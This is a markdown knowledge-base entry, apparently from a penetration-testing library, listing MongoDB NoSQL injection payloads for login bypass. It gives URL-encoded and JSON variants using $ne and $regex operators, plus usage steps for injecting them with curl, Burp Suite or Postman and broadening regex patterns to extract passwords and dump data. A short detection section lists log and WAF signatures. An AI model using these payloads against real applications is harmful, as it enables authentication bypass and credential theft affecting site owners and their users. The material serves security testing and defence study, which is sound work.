---
type: code
language: json
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
tags:
  - nosql-injection
  - mongodb
  - payload
validated: true
---

# MongoDB-NoSQL-Injection-Auth-Payloads

## Code

```json
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

## Description

This code snippet contains example payloads for NoSQL injection attacks targeting MongoDB authentication queries. It includes URL-encoded variants using $ne and $regex operators to bypass username checks and match password patterns, as well as JSON equivalents using $eq and $regex for API requests. These payloads exploit unsanitized inputs to extract user data by altering the query to return matching documents.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| username | Target username for exclusion ($ne) or equality ($eq); use a non-existent value like 'toto' for broad extraction | toto or admin |
| password | Regex pattern for matching passwords (e.g., m.{2} for strings starting with 'm' of length 3+) | m.*, ^md |

## Usage

Inject these payloads into login form fields or API request bodies using tools like curl, Burp Suite, or Postman. For URL format, encode in form-data; for JSON, send as application/json. Test progressively broader patterns (e.g., from specific 'mdp' to wildcard 'm.*') to dump more data. Use in scenarios where the application constructs queries like db.users.find({username: input.username, password: input.password}).

## Detection

- Web application logs showing queries with operators like $regex or $ne in username/password fields.
- Database access logs indicating pattern-matching queries on sensitive fields.
- Increased failed login attempts with irregular payloads, detectable via WAF rules for MongoDB operator signatures.
- Anomalous data access volumes from application accounts.

## Related

- [[procedures/NoSQL-Injection-Extract-User-Data-MongoDB]]
